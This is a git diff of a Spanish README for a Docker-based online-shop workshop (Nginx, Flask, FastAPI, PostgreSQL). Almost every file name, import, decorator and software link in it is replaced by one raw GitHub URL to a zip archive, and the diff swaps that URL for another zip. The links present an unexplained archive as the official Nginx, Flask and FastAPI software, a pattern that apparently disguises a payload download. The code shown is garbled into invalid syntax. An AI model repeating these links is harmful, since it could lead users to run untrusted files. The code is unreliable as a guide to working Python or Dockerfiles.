@@ -4,56 +4,56 @@
 
 Este taller te guiará en la construcción de una tienda virtual utilizando arquitectura multi-capa con contenedores Docker. El proyecto incluye:
 
-- **Proxy** ([Nginx](https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip)): Punto de entrada único desde Internet
-- **Aplicación Web** ([Flask](https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip)): Interfaz de usuario de la Tienda Virtual
-- **API** ([FastAPI](https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip)): Servicio de datos para usuarios, productos y carritos
-- **Base de Datos** ([PostgreSQL](https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip)): Almacenamiento persistente
+- **Proxy** ([Nginx](https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip)): Punto de entrada único desde Internet
+- **Aplicación Web** ([Flask](https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip)): Interfaz de usuario de la Tienda Virtual
+- **API** ([FastAPI](https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip)): Servicio de datos para usuarios, productos y carritos
+- **Base de Datos** ([PostgreSQL](https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip)): Almacenamiento persistente
 
 ## Estructura del Proyecto
 
 ```
 as-taller3/
-├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
-├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
-├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
+├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
+├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
+├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
 ├── database/
 │   ├── Dockerfile
-│   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
-│   └── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
+│   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
+│   └── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
 ├── api/
 │   ├── Dockerfile
-│   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
-│   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
+│   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
+│   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
 │   ├── models/
-│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
-│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
-│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
-│   │   └── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
+│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
+│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
+│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
+│   │   └── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
 │   ├── routes/
-│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
-│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
-│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
-│   │   └── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
-│   └── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
+│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
+│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
+│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
+│   │   └── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
+│   └── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
 ├── webapp/
 │   ├── Dockerfile
-│   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
-│   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
+│   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
+│   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
 │   ├── templates/
-│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
-│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
-│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
-│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
-│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
-│   │   └── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
+│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
+│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
+│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
+│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
+│   │   ├── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
+│   │   └── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
 │   └── static/
 │       ├── css/
-│       │   └── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
+│       │   └── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
 │       └── js/
-│           └── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
+│           └── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
 └── proxy/
     ├── Dockerfile
-    └── https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
+    └── https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
 ```
 
 Sigue el paso a paso para desarrollar el proyecto, y completa el código según indican los comentarios `TODO`.
@@ -64,7 +64,7 @@ Sigue el paso a paso para desarrollar el proyecto, y completa el código según 
 
 ### 1.1 Crear el archivo de configuración principal
 
-Crea el archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Crea el archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```yaml
 version: '3.8'
@@ -125,7 +125,7 @@ networks:
 
 ### 1.2 Crear archivo de variables de entorno
 
-Crea `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Crea `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```bash
 # Base de datos
@@ -156,8 +156,8 @@ Archivo `database/Dockerfile`:
 FROM postgres:15-alpine
 
 # Copiar scripts de inicialización
-COPY https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
-COPY https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
+COPY https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
+COPY https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
 
 # Exponer el puerto
 EXPOSE 5432
@@ -165,7 +165,7 @@ EXPOSE 5432
 
 ### 2.2 Script de inicialización
 
-Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```sql
 -- TODO: Crear la base de datos y configuraciones iniciales
@@ -178,7 +178,7 @@ SET timezone = 'America/Bogota';
 
 ### 2.3 Esquema de la base de datos
 
-Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```sql
 -- TODO: Definir las tablas del sistema
@@ -242,8 +242,8 @@ RUN apt-get update && apt-get install -y \
     && rm -rf /var/lib/apt/lists/*
 
 # Copiar e instalar dependencias de Python
-COPY https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip .
-RUN pip install --no-cache-dir -r https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
+COPY https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip .
+RUN pip install --no-cache-dir -r https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
 
 # Copiar código de la aplicación
 COPY . .
@@ -257,7 +257,7 @@ CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
 
 ### 3.2 Dependencias de la API
 
-Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```txt
 fastapi==0.104.1
@@ -272,16 +272,16 @@ alembic==1.12.1
 
 ### 3.3 Configuración de la base de datos
 
-Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```python
 from sqlalchemy import create_engine
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import declarative_base
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import sessionmaker
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import declarative_base
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import sessionmaker
 import os
 
 # TODO: Configurar la URL de la base de datos desde variables de entorno
-DATABASE_URL = https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip("DATABASE_URL", "postgresql://tienda_user:tienda_password@database:5432/tienda_db")
+DATABASE_URL = https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip("DATABASE_URL", "postgresql://tienda_user:tienda_password@database:5432/tienda_db")
 
 # TODO: Crear el engine de SQLAlchemy
 
@@ -297,12 +297,12 @@ def get_db():
 
 ### 3.4 Modelos de datos
 
-Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```python
 from sqlalchemy import Column, Integer, String, DateTime, Boolean
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import func
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import Base
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import func
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import Base
 
 class User(Base):
     __tablename__ = "users"
@@ -320,12 +320,12 @@ class User(Base):
         pass
 ```
 
-Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```python
 from sqlalchemy import Column, Integer, String, Numeric, DateTime
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import func
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import Base
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import func
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import Base
 
 class Product(Base):
     __tablename__ = "products"
@@ -344,13 +344,13 @@ class Product(Base):
         pass
 ```
 
-Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```python
 from sqlalchemy import Column, Integer, ForeignKey, DateTime
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import relationship
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import func
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import Base
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import relationship
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import func
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import Base
 
 class Cart(Base):
     __tablename__ = "carts"
@@ -382,138 +382,138 @@ class CartItem(Base):
 
 ### 3.5 Rutas de la API
 
-Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```python
 from fastapi import FastAPI, Depends, HTTPException, status
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import CORSMiddleware
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import Session
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import get_db
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import users, products, carts
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import CORSMiddleware
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import Session
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import get_db
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import users, products, carts
 
 # TODO: Crear la instancia de FastAPI
 app = FastAPI(title="Tienda Virtual API", version="1.0.0")
 
 # TODO: Configurar CORS
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip(
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip(
     CORSMiddleware,
     # TODO: Configurar orígenes permitidos, métodos, etc.
 )
 
 # TODO: Incluir los routers
-# https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip(https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip, prefix="/api/v1/users", tags=["users"])
-# https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip(https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip, prefix="/api/v1/products", tags=["products"])
-# https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip(https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip, prefix="/api/v1/carts", tags=["carts"])
+# https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip(https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip, prefix="/api/v1/users", tags=["users"])
+# https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip(https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip, prefix="/api/v1/products", tags=["products"])
+# https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip(https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip, prefix="/api/v1/carts", tags=["carts"])
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip("/")
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip("/")
 async def root():
     # TODO: Endpoint de prueba
     return {"message": "Tienda Virtual API"}
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip("/health")
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip("/health")
 async def health_check():
     # TODO: Endpoint de verificación de salud
     pass
 ```
 
-Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```python
 from fastapi import APIRouter, Depends, HTTPException, status
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import Session
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import get_db
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import User
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import Session
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import get_db
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import User
 
 router = APIRouter()
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip("/register")
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip("/register")
 async def register_user(db: Session = Depends(get_db)):
     # TODO: Implementar registro de usuario
     pass
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip("/login")  
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip("/login")  
 async def login_user(db: Session = Depends(get_db)):
     # TODO: Implementar login de usuario
     pass
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip("/profile")
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip("/profile")
 async def get_user_profile(db: Session = Depends(get_db)):
     # TODO: Implementar obtener perfil de usuario
     pass
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip("/profile")
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip("/profile")
 async def update_user_profile(db: Session = Depends(get_db)):
     # TODO: Implementar actualizar perfil de usuario
     pass
 ```
 
-Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```python
 from fastapi import APIRouter, Depends, HTTPException, status
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import Session
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import get_db
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import Product
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import Session
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import get_db
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import Product
 
 router = APIRouter()
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip("/")
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip("/")
 async def get_products(db: Session = Depends(get_db)):
     # TODO: Implementar obtener lista de productos
     pass
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip("/{product_id}")
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip("/{product_id}")
 async def get_product(product_id: int, db: Session = Depends(get_db)):
     # TODO: Implementar obtener producto por ID
     pass
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip("/")
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip("/")
 async def create_product(db: Session = Depends(get_db)):
     # TODO: Implementar crear producto (admin)
     pass
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip("/{product_id}")
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip("/{product_id}")
 async def update_product(product_id: int, db: Session = Depends(get_db)):
     # TODO: Implementar actualizar producto
     pass
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip("/{product_id}")
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip("/{product_id}")
 async def delete_product(product_id: int, db: Session = Depends(get_db)):
     # TODO: Implementar eliminar producto
     pass
 ```
 
-Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```python
 from fastapi import APIRouter, Depends, HTTPException, status
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import Session
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import get_db
-from https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip import Cart, CartItem
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import Session
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import get_db
+from https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip import Cart, CartItem
 
 router = APIRouter()
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip("/")
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip("/")
 async def get_user_cart(db: Session = Depends(get_db)):
     # TODO: Implementar obtener carrito del usuario
     pass
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip("/items")
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip("/items")
 async def add_item_to_cart(db: Session = Depends(get_db)):
     # TODO: Implementar agregar item al carrito
     pass
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip("/items/{item_id}")
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip("/items/{item_id}")
 async def update_cart_item(item_id: int, db: Session = Depends(get_db)):
     # TODO: Implementar actualizar cantidad de item
     pass
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip("/items/{item_id}")
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip("/items/{item_id}")
 async def remove_item_from_cart(item_id: int, db: Session = Depends(get_db)):
     # TODO: Implementar remover item del carrito
     pass
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip("/")
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip("/")
 async def clear_cart(db: Session = Depends(get_db)):
     # TODO: Implementar limpiar carrito
     pass
@@ -554,8 +554,8 @@ RUN apt-get update && apt-get install -y \
     && rm -rf /var/lib/apt/lists/*
 
 # Copiar e instalar dependencias de Python
-COPY https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip .
-RUN pip install --no-cache-dir -r https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
+COPY https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip .
+RUN pip install --no-cache-dir -r https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
 
 # Copiar código de la aplicación
 COPY . .
@@ -564,12 +564,12 @@ COPY . .
 EXPOSE 5000
 
 # Comando para ejecutar la aplicación
-CMD ["python", "https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip"]
+CMD ["python", "https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip"]
 ```
 
 ### 4.2 Dependencias de la aplicación web
 
-Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```txt
 Flask==3.0.0
@@ -579,7 +579,7 @@ python-dotenv==1.0.0
 
 ### 4.3 Aplicación principal
 
-Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```python
 from flask import Flask, render_template, request, redirect, url_for, session, flash
@@ -589,52 +589,52 @@ from datetime import datetime
 
 # TODO: Configurar la aplicación Flask
 app = Flask(__name__)
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip = https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip('FLASK_SECRET_KEY', 'clave-por-defecto-cambiar')
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip = https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip('FLASK_SECRET_KEY', 'clave-por-defecto-cambiar')
 
 # TODO: Configurar la URL de la API
-API_URL = https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip('API_URL', 'http://api:8000')
+API_URL = https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip('API_URL', 'http://api:8000')
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip('/')
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip('/')
 def index():
     # TODO: Implementar página principal
     # Obtener productos destacados de la API
-    return render_template('https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip')
+    return render_template('https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip')
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip('/products')
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip('/products')
 def products():
     # TODO: Implementar página de productos
     # Obtener lista de productos de la API
-    return render_template('https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip')
+    return render_template('https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip')
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip('/login', methods=['GET', 'POST'])
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip('/login', methods=['GET', 'POST'])
 def login():
-    if https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip == 'POST':
+    if https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip == 'POST':
         # TODO: Implementar lógica de login
         # Enviar datos a la API de autenticación
         pass
-    return render_template('https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip')
+    return render_template('https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip')
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip('/register', methods=['GET', 'POST'])
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip('/register', methods=['GET', 'POST'])
 def register():
-    if https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip == 'POST':
+    if https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip == 'POST':
         # TODO: Implementar lógica de registro
         # Enviar datos a la API de registro
         pass
-    return render_template('https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip')
+    return render_template('https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip')
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip('/cart')
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip('/cart')
 def cart():
     # TODO: Implementar página del carrito
     # Obtener carrito del usuario de la API
-    return render_template('https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip')
+    return render_template('https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip')
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip('/add-to-cart/<int:product_id>', methods=['POST'])
